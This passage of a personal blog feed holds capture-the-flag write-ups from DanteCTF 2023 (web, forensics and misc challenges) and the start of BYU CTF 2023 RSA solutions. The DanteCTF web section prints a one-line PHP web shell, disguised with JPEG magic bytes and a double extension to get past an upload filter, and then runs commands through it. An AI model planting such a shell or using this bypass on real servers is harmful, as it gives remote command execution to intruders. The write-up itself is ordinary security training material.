&lt;p&gt;I tried to upload this on the website, Got an error message.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;The extension &#x27;.php&#x27; indicate it is not an image!&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, Tried some extension bypass techniques on the hacktricks webpage. Now uploaded the file as &lt;code&gt;file.jpg.php&lt;&#x2F;code&gt;. Again got an error.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Uploaded file seems to be not a real image!&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Okay, there might be a magic bytes check was done here. So, I edited the magic bytes of the &lt;code&gt;file.jpg.php&lt;&#x2F;code&gt; with the &lt;strong&gt;hexed.it&lt;&#x2F;strong&gt; webtool. Inserted the &lt;code&gt;jpg&lt;&#x2F;code&gt; header values to the &lt;code&gt;file.jpg.php&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000000:&lt;&#x2F;span&gt;&lt;span&gt; ffd8 ff3c 3f70 6870 0a09 6563 686f 2073  ...&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span&gt;php..echo s
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000010:&lt;&#x2F;span&gt;&lt;span&gt; 6865 6c6c 5f65 7865 6328 245f 4745 545b  hell_exec($_GET[
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;00000020:&lt;&#x2F;span&gt;&lt;span&gt; 2763 6d64 275d 293b 0a3f 3e0a            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;cmd&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;.?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, as we can see in the above hexdump of the file contains jpg headers.&lt;&#x2F;p&gt;
&lt;p&gt;Lets try to upload this file.&lt;&#x2F;p&gt;
&lt;p&gt;This time everything was fine and the image &lt;code&gt;file.jpg.php&lt;&#x2F;code&gt; was not rendered as it is not an image. I moved to the actual URL of the uploaded file as we already founf it in the beginning.&lt;&#x2F;p&gt;
&lt;p&gt;I moved to &lt;code&gt;https:&#x2F;&#x2F;dumbadmin.challs.dantectf.it&#x2F;f9bbbecb61014db8f0674bf60c27e668&#x2F;9180871cb76494741eb99e2181d57e54.jpg.php&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And there were nothing to see, then i passed &lt;code&gt;ls&lt;&#x2F;code&gt; in the &lt;code&gt;cmd&lt;&#x2F;code&gt; argument from the URL.&lt;&#x2F;p&gt;
&lt;p&gt;Boom, This prints the list of files available on the server.&lt;&#x2F;p&gt;
&lt;p&gt;Now we can move across the file system of the server, I found the flag was at &lt;code&gt;&#x2F;flag.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The URL, &lt;code&gt;https:&#x2F;&#x2F;dumbadmin.challs.dantectf.it&#x2F;f9bbbecb61014db8f0674bf60c27e668&#x2F;9180871cb76494741eb99e2181d57e54.jpg.php?cmd=cat%20&#x2F;flag.txt&lt;&#x2F;code&gt; . Prints out the flag for us&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DANTE{Y0u_Kn0w_how_t0_bypass_things_in_PhP9Abd7BdCFF}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;forensics&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#forensics&quot; aria-label=&quot;Anchor link for: forensics&quot;&gt;Forensics&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;imago-qualitatis&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#imago-qualitatis&quot; aria-label=&quot;Anchor link for: imago-qualitatis&quot;&gt;Imago Qualitatis&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;A wondrous electromagnetic wave was captured by a metal-stick-handed devil.
&lt;&#x2F;span&gt;&lt;span&gt;‚ÄúBut.. What? No, not this way. Maybe, if I turn around like this‚Ä¶ Aha!‚Äù
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [ImagoQualitatis.7z]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The ImagoQualitatis.7z archive contains the &lt;code&gt;gqrx_20230421_133330_433000000_1800000_fc.raw&lt;&#x2F;code&gt; file of size 4GB+.&lt;&#x2F;p&gt;
&lt;p&gt;I searched about the term &lt;code&gt;gqrx&lt;&#x2F;code&gt; on google, and found that it was a radio transmission raw file.
&#x2F;
The software used to generate this file was &lt;code&gt;gqrx sdr&lt;&#x2F;code&gt;, which is an open source software defined radio receiver (SDR) powered by the GNU Radio and the Qt graphical toolkit.&lt;&#x2F;p&gt;
&lt;p&gt;Then I installed it on my machine using the following command&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install gnuradio gqrx&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Then Launched the software with the command &lt;code&gt;gqrx&lt;&#x2F;code&gt;. It loaded the software.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dante23&#x2F;dante23_imago1.png&quot; alt=&quot;gqrx&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I dont know how to play the &lt;code&gt;raw&lt;&#x2F;code&gt; file in this software.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;hamsci.org&#x2F;resource&#x2F;how-play-rri-raw-iq-file-gqrx&quot; target=&quot;_blank&quot;&gt;This&lt;&#x2F;a&gt; tutorial helped me to load the raw file on the gqrx software.&lt;&#x2F;p&gt;
&lt;p&gt;I played the raw file and observed the spectrum displayed on in the software console. I saw flag characters were display with some delay in between them.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dante23&#x2F;dante23_imago2.png&quot; alt=&quot;gqrx&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Noted down the characters on paper.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DANTE{n3w_w4v35_0ld_5ch00l}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;do-you-know-gif&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#do-you-know-gif&quot; aria-label=&quot;Anchor link for: do-you-know-gif&quot;&gt;Do You Know GIF?&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Ah, Dante! He appears in poems, videogames‚Ä¶ He wrote about a lot of people but few have something meaningful to say about him nowadays.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [dante.gif(14mb)]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The file size tempted me to check for the embedded files in the GIF using &lt;code&gt;steghide&lt;&#x2F;code&gt;,&lt;code&gt;stegoveritas&lt;&#x2F;code&gt; and &lt;code&gt;stegextract&lt;&#x2F;code&gt; and many more, but none of them was able to extract data.&lt;&#x2F;p&gt;
&lt;p&gt;Then tried exiftool on the &lt;code&gt;dante.gif&lt;&#x2F;code&gt;. Found a comment but it was not a flag. After trying all options on exiftool &lt;code&gt;-a&lt;&#x2F;code&gt; of exiftool loaded all the comments of &lt;code&gt;dante.gif&lt;&#x2F;code&gt; file.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; exiftool dante.gif  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;grep&lt;&#x2F;span&gt;&lt;span&gt; Comment
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : Hey look, a comment!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; exiftool&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -a&lt;&#x2F;span&gt;&lt;span&gt; dante.gif  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;grep&lt;&#x2F;span&gt;&lt;span&gt; Comment
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : Hey look, a comment!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : These comments sure do look useful
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : I wonder what else I could do with them&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : 44414e54457b673166355f
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : 3472335f6d3464335f6279
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : 5f626c30636b357d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : At the edges of the map lies the void
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Converted the hex strings to ascii to get the flag&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;44414e54457b673166355f : DANTE{g1f5_
&lt;&#x2F;span&gt;&lt;span&gt;3472335f6d3464335f6279 : 4r3_m4d3_by
&lt;&#x2F;span&gt;&lt;span&gt;5f626c30636b357d : _bl0ck5}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag: DANTE{g1f5_4r3_m4d3_by_bl0ck5}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;misc&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc&quot; aria-label=&quot;Anchor link for: misc&quot;&gt;Misc&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;flag-fabber&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#flag-fabber&quot; aria-label=&quot;Anchor link for: flag-fabber&quot;&gt;Flag Fabber&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;The modern times offer marvelous ways of bringing your projects to life. Well, in 1300 AD they didn‚Äôt really have mass manufacturing tools, so that‚Äôs not a fair comparison after all.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [agFabber.zip]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Zip file has multiple files with extensions [.gbs,.gbl,.gbp]&lt;&#x2F;p&gt;
&lt;p&gt;Reading one of the file has the following content.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&#x2F;$&lt;&#x2F;span&gt;&lt;span&gt; head flagFabber-B_Cu.gbl
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;G04 &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#@! TF.GenerationSoftware,KiCad,Pcbnew,7.0.1*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;G04 &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#@! TF.CreationDate,2023-05-15T13:30:28+02:00*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;G04 &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#@! TF.ProjectId,flagfabber,666c6167-6661-4626-9265-722e6b696361,rev?*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;G04 &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#@! TF.SameCoordinates,Original*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;G04 &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#@! TF.FileFunction,Copper,L2,Bot*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;G04 &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#@! TF.FilePolarity,Positive*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;FSLAX46Y46&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*%
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;G04&lt;&#x2F;span&gt;&lt;span&gt; Gerber Fmt 4.6, Leading zero omitted, Abs format (unit mm)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;G04&lt;&#x2F;span&gt;&lt;span&gt; Created by KiCad (PCBNEW 7.0.1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;date&lt;&#x2F;span&gt;&lt;span&gt; 2023-05-15 13:30:28&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;MOMM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*%
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A quick search about &lt;code&gt;Gerber&lt;&#x2F;code&gt;, &lt;code&gt;gbs,gbl files&lt;&#x2F;code&gt; adn &lt;code&gt;Kicad&lt;&#x2F;code&gt; says that it was a &lt;code&gt;Gerber file&lt;&#x2F;code&gt; Generated by Kicad. Used An online &lt;a href=&quot;https:&#x2F;&#x2F;www.pcbgogo.com&#x2F;GerberViewer.html&quot; target=_blank&gt;Gerber Viewer&lt;&#x2F;a&gt; to visualize the file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dante23&#x2F;dante23_gerber.png&quot; alt=&quot;Gerber&quot; &#x2F;&gt; (image from born2scan)&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DANTE{pcb5_4r3_c00l}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;hanging-nose&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#hanging-nose&quot; aria-label=&quot;Anchor link for: hanging-nose&quot;&gt;Hanging Nose&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Divine Comedy-themed Christmas tree baubles: that‚Äôs the future of the ornaments business, I‚Äôm telling you!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [HangingNose.stl]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Used an online stl file viewer to visualize the 3D file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.viewstl.com&#x2F;&quot; target=_blank&gt;stl viewer&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dante23&#x2F;dante23_hanging.png&quot; alt=&quot;Hanging&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you for reading!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>BYU CTF 2023</title>
        <published>2023-05-22T00:00:00+00:00</published>
        <updated>2023-05-22T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/byuctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/byuctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/byuctf23/">&lt;p&gt;Hello all!
I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1935&quot; target=_blank&gt;BYUCTF 2023&lt;&#x2F;a&gt; which was happened from  19 May to 21 May. I played it with my team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This time again bumped up with the progress, Solved 25 challs&lt;br&gt; + First Bloods - 4 ü©∏ (Crypto)&lt;br&gt; + Solved Pentesting Series
And a lot more lets talk about the solutions.&lt;&#x2F;p&gt;
&lt;img src =&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;byu23&#x2F;byu23_progress.png&quot; class=&quot;&quot;&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto&quot; aria-label=&quot;Anchor link for: crypto&quot;&gt;Crypto&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;rsa-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rsa-1&quot; aria-label=&quot;Anchor link for: rsa-1&quot;&gt;RSA-1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;n = 287838647563564518717519107521814079281
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e = 7
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c = 258476617615202392748150555415953446503
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A warmup chall, The n was small the prime factors of n are brought from factordb. Here&#x27;s the solve.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;287838647563564518717519107521814079281
&lt;&#x2F;span&gt;&lt;span&gt;e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7
&lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;258476617615202392748150555415953446503
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#from factordb
&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15631612382272805561
&lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18413880828441662521
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;phi)
&lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(m))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# byuctf{too_smol}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{too_smol}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;rsa-2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rsa-2&quot; aria-label=&quot;Anchor link for: rsa-2&quot;&gt;RSA-2&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;n = 546014635841741214724882952304387823741798461149589549073179989118942746109940806878269775538274570065946589413677004071487344751464649121103982272835006900203922112014630898761428602513684456008956735791010937229939856259403186940249737579526542460562078728957198932156520780835942292131829398548678970431263462917223085165930683353518778015361505451889259321493813123084031407195410778661720394898118828299025325200597986154170392835072784810370185329392356423340408483449291280713796374297147668615988522804223480631576577707073715128342533703842150980913675658012799681575774731843549389349977365287936534707998476564357339504431638612839358093914282814270477657856345062084136585402704930924062452984009716927826681976269057923158930326380110735873715506666086031427627450725825495228912040943784627278987497908133546573083543604901933763330940965980882566819970423354937076331119777415405707162588442490342746115310986462330781467571631209829523895479737199963129517613642920935109776495829400236613168913129178658637967592913193540283532220304664924612246117951571439486418122093867454452618997458068515332016877486822805232899716524040444751997121936138984564834862354469295078855441829018404782747219665338778379471257704041
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e = 65537
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c = 497483520135207500611760341868934810216889295862727367409205471739457798733223813938415492642898622071289502771394670201759355356873731071744923938304067196827981196823596976532284031567818944043351160692892539254848854527943095670705184836531463778923699513154523281624336593518751911469590777921172775020125081803529411082078530404614569485860638460689961289946436553586222781503048987585305336865777424252321433817251942278548031598867440246798562662298880488044382840476214732326114298681849826143159014132251265975612736174765852107701466877003101250308950535660691651846052082123375934624356694170453897672257371991315676787548733520567289929667876604682273501711766130944645562650989837328685043543330211830184365436596077862055649246517141787872170320358968622818470064395975654949073402489903952399985907827496667385839890041608685588908200009780210043116940593521695695047783434230143405184690206691002634954008353327872663055826018481013718627348218684688250775372760462829705754318024652361552668830110066219305953343851243676904796434142570868419087560131333056695456062994781034014322792678534785191950145702468201676105282230660132801024614625267740668507168119879074770666830923799616054485447308126877109671082189614
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;FactorDB able to factorize the n again. Here is the full solv.py&lt;&#x2F;p&gt;
